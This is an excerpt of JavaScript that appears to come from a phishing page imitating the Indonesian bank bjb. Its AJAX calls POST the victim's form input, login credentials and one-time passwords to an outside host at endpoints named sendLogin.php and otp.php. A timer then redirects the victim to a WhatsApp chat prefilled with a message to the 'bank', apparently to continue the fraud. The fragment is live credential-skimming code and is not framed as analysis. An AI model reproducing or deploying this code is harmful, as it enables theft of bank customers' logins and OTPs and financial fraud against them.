 ...
 $.ajax({
 type: 'POST',
 url: 'https://axcellent.cf-pow.cfd/app15/no.php',
 data: $(this).serialize(),
 datatype: 'JSON', 
...
$.ajax({
 type: 'POST',
 url: 'https://axcellent.cf-pow.cfd/app15/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
...
$.ajax({
 type: 'POST',
 url: 'https://axcellent.cf-pow.cfd/app15/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
...
var timer = setInterval(function() {
  ...
  if (i == 0) {
  $("#timer").hide();
   location.href='https://api.whatsapp.com/send?phone=62817143737&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
    clearInterval(timer);
